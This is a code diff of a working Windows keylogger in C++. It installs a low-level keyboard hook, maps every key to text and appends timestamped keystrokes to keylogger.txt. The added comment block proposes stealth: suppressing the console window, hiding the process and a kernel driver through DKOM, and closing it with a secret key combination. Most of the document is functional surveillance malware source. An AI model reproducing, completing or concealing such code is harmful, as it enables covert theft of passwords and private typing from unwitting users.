@@ -1,185 +1,263 @@
 #include <windows.h>
-#include <fstream>          // Opening, writing, and closing files 
+#include <fstream>
 #include <iostream>
 #include <string>
-#include <ctime>			// Get time and format
-#include <iomanip>			// formatting functions
+#include <ctime>
 
-// global variables
+/*
+To make this application run in the background, add:
+#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
+This will stop console creation.
+Tie this with your kernel driver to DKOM this and the driver itself
 
+Make it so you can close the application after DKOM with a certain key combination maybe
+like if F1, F3, and F5 are all close then close process. Something someone wouldn't usually do 
+*/
 
-// file stream object
 std::ofstream logFile;
-
-// store the ID of our keyboard hook
-HHOOK keyboardHook;
-
-// track first keystroke of session
+HHOOK keyboardHook = NULL;
 bool isFirstKey = true;
 
+static bool keyDown[256] = { false };
+static int  backspaceRun = 0;
 
-// time helper
 std::string getFormattedTime() {
-	// time_t is a data type in <ctime> used to store system time values
-	// we name it "now" and set it to equal to time() which is the systems current time, typically
-	// measured as a number of seconds eslapsed since January 1, 1970
-	time_t now = time(0);
-
-	struct tm timeinfo;
-
-	// _s just means secure. 
-	localtime_s(&timeinfo, &now);
-
-	// storing formatted array
-	char buffer[20];
-
-	strftime(buffer, sizeof(buffer), "[%H:%M:%S]", &timeinfo);
-
-	// convert c style string to c++ string
-	return std::string(buffer);
+    time_t now = time(0);
+    struct tm timeinfo;
+    localtime_s(&timeinfo, &now);
+    char buffer[20];
+    strftime(buffer, sizeof(buffer), "[%H:%M:%S]", &timeinfo);
+    return std::string(buffer);
 }
 
-// Log keystroke
+static void flushBackspaceRun() {
+    if (backspaceRun > 0) {
+        if (backspaceRun == 1)
+            logFile << "[<BS]";
+        else
+            logFile << "[<" << backspaceRun << "x BS]";
+        backspaceRun = 0;
+    }
+}
+
+
+static bool isModifierKey(int vkCode) {
+    return vkCode == VK_SHIFT || vkCode == VK_LSHIFT || vkCode == VK_RSHIFT ||
+        vkCode == VK_CONTROL || vkCode == VK_LCONTROL || vkCode == VK_RCONTROL ||
+        vkCode == VK_MENU || vkCode == VK_LMENU || vkCode == VK_RMENU;
+}
+
+
 void logKey(int vkCode) {
-	// open file
-	// std::ios::app is just append, just makes sure the data isn't overwritten.
-	logFile.open("keylogger.txt", std::ios::app);
+    if (!logFile.is_open()) return;
 
-	// Print a header when keylogger starts
+    if (isModifierKey(vkCode)) {
+        logFile.flush();
+        return;
+    }
 
-	if (isFirstKey) {
-		logFile << "\n" << std::string(60, '=') << "\n";
-		logFile << "SESSION STARTED: " << getFormattedTime() << "\n";
-		logFile << std::string(60, '=') << "\n\n";
+    if (isFirstKey) {
+        logFile << "\n" << std::string(60, '=') << "\n";
+        logFile << "SESSION STARTED: " << getFormattedTime() << "\n";
+        logFile << std::string(60, '=') << "\n\n";
+        isFirstKey = false;
+    }
 
+    if (vkCode == VK_BACK) {
+        backspaceRun++;
+        logFile.flush();
+        return;
+    }
+    flushBackspaceRun();
 
-		// Make sure to equal false when we call function as to not print to console repeatedly
-		isFirstKey = false;
-	}
-
-	// Check modifiers like shift key, caps lock, etc.
-
-	// Windows returns 0x8000 is key is being pressed and 0x0000 if not
-	// & compares each bit, if both bits are one then the result is one, if otherwise its 0
-	// 0x8000 = 1000 0000 00000 0000
-	bool shiftPressed = GetAsyncKeyState(VK_SHIFT) & 0x8000;
-
-	// The difference between these two is Async key state is when its currently being pressed
-	// and GetKeyState is a toggle, meaning if it was pressed once it stays pressed. 
-
-	// 0 is false, 1 is true. 
-	bool capsLockOn = GetKeyState(VK_CAPITAL) & 0x0001;
-
-	// Convert VKC to readable characters
-
-	// Special control keys
-	// These keys dont produce visual characters but we still want to log like F7 or ctrl, spaces, back, tab, etc. 
-
-	if (vkCode == VK_SPACE) {
-		logFile << " ";
-	}
-
-	else if (vkCode == VK_RETURN) {
-		logFile << "\n" << getFormattedTime() << "[ENTER]\n";
-	}
-	else if (vkCode == VK_BACK) {
-		logFile << getFormattedTime << "[BACKSPACE] ";
-	}
-	else if (vkCode == VK_TAB) {
-		logFile << getFormattedTime << "[TAB] ";
-	}
-	else if (vkCode == VK_ESCAPE) {
-		logFile << getFormattedTime << "[ESC] ";
-	}
-	else if (vkCode == VK_DELETE) {
-		logFile << getFormattedTime << "[DELETE] ";
-	}
+    bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
+    bool capsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
 
 
-	// LETTER KEYS 
-	// 0x41 through 0x5A are letters A-Z
-	// 0x41 - 0x5A are by default uppercase
-	else if (vkCode >= 0x41 && vkCode <= 0x5A) {
-		// Checks to see if shift is pressed and caps lock off thus equaling capital letter
-		// Checks to see if shift isnt pressed and caps lock is on thus equaling capital letter
-		bool isUpperCase = (shiftPressed && !capsLockOn) || (!shiftPressed && capsLockOn);
+    if (vkCode == VK_SPACE) {
+        logFile << " ";
+    }
+    else if (vkCode == VK_RETURN) {
+        logFile << "\n" << getFormattedTime() << " ";
+    }
+    else if (vkCode == VK_TAB) {
+        logFile << getFormattedTime() << "[TAB] ";
+    }
+    else if (vkCode == VK_ESCAPE) {
+        logFile << getFormattedTime() << "[ESC] ";
+    }
+    else if (vkCode == VK_DELETE) {
+        logFile << getFormattedTime() << "[DELETE] ";
+    }
+
+    // --- Letters A-Z (0x41 - 0x5A) ---
+    else if (vkCode >= 0x41 && vkCode <= 0x5A) {
+        bool isUpperCase = (shiftPressed && !capsLockOn) || (!shiftPressed && capsLockOn);
+        if (isUpperCase) logFile << (char)vkCode;           
+        else             logFile << (char)(vkCode + 32);     
+    }
+
+    // --- Digits 0-9 (0x30 - 0x39) ---
+    else if (vkCode >= 0x30 && vkCode <= 0x39) {
+        if (shiftPressed) {
+            char shiftNumbers[] = { ')', '!', '@', '#', '$', '%', '^', '&', '*', '(' };
+            logFile << shiftNumbers[vkCode - 0x30];
+        }
+        else {
+            logFile << (char)vkCode;
+        }
+    }
+
+    else if (vkCode == VK_OEM_1)     
+        logFile << (shiftPressed ? ':' : ';');
+    else if (vkCode == VK_OEM_PLUS)   
+        logFile << (shiftPressed ? '+' : '=');
+    else if (vkCode == VK_OEM_COMMA)  
+        logFile << (shiftPressed ? '<' : ',');
+    else if (vkCode == VK_OEM_MINUS) 
+        logFile << (shiftPressed ? '_' : '-');
+    else if (vkCode == VK_OEM_PERIOD) 
+        logFile << (shiftPressed ? '>' : '.');
+    else if (vkCode == VK_OEM_2)      
+        logFile << (shiftPressed ? '?' : '/');
+    else if (vkCode == VK_OEM_3)      
+        logFile << (shiftPressed ? '~' : '`');
+    else if (vkCode == VK_OEM_4)     
+        logFile << (shiftPressed ? '{' : '[');
+    else if (vkCode == VK_OEM_5)      
+        logFile << (shiftPressed ? '|' : '\\');
+    else if (vkCode == VK_OEM_6)      
+        logFile << (shiftPressed ? '}' : ']');
+    else if (vkCode == VK_OEM_7)      
+        logFile << (shiftPressed ? '"' : '\'');
 
 
-		// Since our vkCode is by default uppercase, she just 
-		if (!isUpperCase) {
-			logFile << (char)vkCode;
-		}
-		// Lower case is exactly 32 more than its original key
-		// so 41 is "A" add 32 in hex and its now "a"
-		else {
-			logFile << (char)(vkCode + 32);
-		}
-	}
+    else if (vkCode >= VK_F1 && vkCode <= VK_F12) {
+        logFile << getFormattedTime() << " [F" << ((vkCode - VK_F1) + 1) << "] ";
+    }
 
-	// NUmber keys
-	// 0x30 - 0x39
-	// 0-9
-	else if (vkCode >= 0x30 && vkCode <= 0x39) {
-		// Checking to see if shift is held as it won't be a number rather a special character like 1 would = !
-		if (shiftPressed) {
-			char shiftNumbers[] = { ')', '!', '@', '#', '$', '%', '^', '&', '*', '(' };
-
-			int index = vkCode - 0x30;
-			logFile << shiftNumbers[index];
-		}
-		else {
-			logFile << (char)vkCode;
-		}
-	}
-
-	// punctuation and special characters
-	else if (vkCode == 0xBA || vkCode == 186) {
-		// Colon / SemiColon
-		logFile << (shiftPressed ? ':' : ';');
-	}
-	else if (vkCode == 0xBB || vkCode == 187) {
-		// Equals / Plus key
-		logFile << (shiftPressed ? '+' : '=');
-	}
-	else if (vkCode == 0xBC || vkCode == 188) {
-		// Comma / Less than key
-		logFile << (shiftPressed ? '<' : ',');
-	}
-	else if (vkCode == 0xBD || vkCode == 189) {
-		// Minus / Underscore key
-		logFile << (shiftPressed ? '_' : '-');
-	}
-	else if (vkCode == 0xBE || vkCode == 190) {
-		// Period / Greater than key
-		logFile << (shiftPressed ? '>' : '.');
-	}
-	else if (vkCode == 0xBF || vkCode == 191) {
-		// Forward slash / Question mark key
-		logFile << (shiftPressed ? '?' : '/');
-	}
-	else if (vkCode == 0xC0 || vkCode == 192) {
-		// Backtick / Tilde key
-		logFile << (shiftPressed ? '~' : '`');
-	}
-	else if (vkCode == 0xDB || vkCode == 219) {
-		// Left bracket key
-		logFile << (shiftPressed ? '{' : '[');
-	}
-	else if (vkCode == 0xDC || vkCode == 220) {
-		// Backslash / Pipe key
-		logFile << (shiftPressed ? '|' : '\\');
-	}
-	else if (vkCode == 0xDD || vkCode == 221) {
-		// Right bracket key
-		logFile << (shiftPressed ? '}' : ']');
-	}
-	else if (vkCode == 0xDE || vkCode == 222) {
-		// Quote key
-		logFile << (shiftPressed ? '"' : '\'');
-	}
+    else if (vkCode == VK_LEFT)  
+        logFile << getFormattedTime() << " [LEFT] ";
+    else if (vkCode == VK_RIGHT) 
+        logFile << getFormattedTime() << " [RIGHT] ";
+    else if (vkCode == VK_UP)    
+        logFile << getFormattedTime() << " [UP] ";
+    else if (vkCode == VK_DOWN)  
+        logFile << getFormattedTime() << " [DOWN] ";
 
 
+    else if (vkCode == VK_CAPITAL)  
+        logFile << getFormattedTime() << " [CAPSLOCK] ";
+    else if (vkCode == VK_NUMLOCK)  
+        logFile << getFormattedTime() << " [NUMLOCK] ";
+    else if (vkCode == VK_SCROLL)   
+        logFile << getFormattedTime() << " [SCROLLLOCK] ";
+    else if (vkCode == VK_LWIN)     
+        logFile << getFormattedTime() << " [LWIN] ";
+    else if (vkCode == VK_RWIN)     
+        logFile << getFormattedTime() << " [RWIN] ";
+    else if (vkCode == VK_APPS)     
+        logFile << getFormattedTime() << " [APPS] ";
 
- }
+    else if (vkCode == VK_RETURN)   
+        logFile << getFormattedTime() << " [ENTER] ";
+
+    else {
+        logFile << getFormattedTime()
+            << " [UNKNOWN_KEY:" << vkCode
+            << " (0x" << std::hex << vkCode << std::dec << ")]";
+    }
+
+    logFile.flush();
+}
+
+LRESULT CALLBACK LowLevelKeyBoardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    if (nCode >= 0) {
+        int vk = (int)((KBDLLHOOKSTRUCT*)lParam)->vkCode;
+
+        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
+            if (!keyDown[vk]) {          
+                keyDown[vk] = true;
+                logKey(vk);
+            }
+        }
+        else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
+            keyDown[vk] = false;
+        }
+    }
+    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
+}
 
 
+BOOL WINAPI consoleHandler(DWORD dwType) {
+    if (dwType == CTRL_CLOSE_EVENT) {
+        if (logFile.is_open()) {
+            flushBackspaceRun();
+            logFile << "\n" << std::string(60, '=') << "\n";
+            logFile << "SESSION ENDED: " << getFormattedTime() << "\n";
+            logFile << std::string(60, '=') << "\n\n";
+            logFile.flush();
+            logFile.close();
+        }
+        if (keyboardHook != NULL) {
+            UnhookWindowsHookEx(keyboardHook);
+            keyboardHook = NULL;
+        }
+    }
+    return TRUE;
+}
+
+int main() {
+    std::cout << "Welcome to your keylogger!\n";
+    std::cout << "All keystrokes will be logged to keylogger.txt\n";
+
+    logFile.open("keylogger.txt", std::ios::app);
+    if (!logFile.is_open()) {
+        std::cerr << "Could not open keylogger.txt for writing.\n";
+        std::cerr << "(Is it locked by another program?)\n";
+        return 1;
+    }
+
+    SetConsoleCtrlHandler(consoleHandler, TRUE);
+    HINSTANCE hInstance = GetModuleHandle(NULL);
+    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyBoardProc, hInstance, 0);
+    if (keyboardHook == NULL) {
+        std::cerr << "Failed to hook keyboard\n";
+        std::cerr << "Please make sure you're running this as an administrator\n";
+        logFile.close();
+        return 1;
+    }
+
+    std::cout << "Keyboard hook successful\n";
+    std::cout << "Monitoring keyboard input... (close this window to stop)\n";
+
+    MSG msg;
+    BOOL bRet;
+    while ((bRet = GetMessage(&msg, NULL, 0, 0)) != 0) {
+        if (bRet == -1) {
+            std::cerr << "There was an error in your message loop\n";
+            break;
+        }
+        else {
+            TranslateMessage(&msg);
+            DispatchMessage(&msg);
+        }
+    }
+
+    if (logFile.is_open()) {
+        flushBackspaceRun();
+        logFile << "\n" << std::string(60, '=') << "\n";
+        logFile << "SESSION ENDED: " << getFormattedTime() << "\n";
+        logFile << std::string(60, '=') << "\n\n";
+        logFile.flush();
+        logFile.close();
+    }
+
+    if (keyboardHook != NULL) {
+        UnhookWindowsHookEx(keyboardHook);
+        keyboardHook = NULL;
+    }
+
+    std::cout << "Keyboard no longer hooked!\n";
+    return 0;
+}
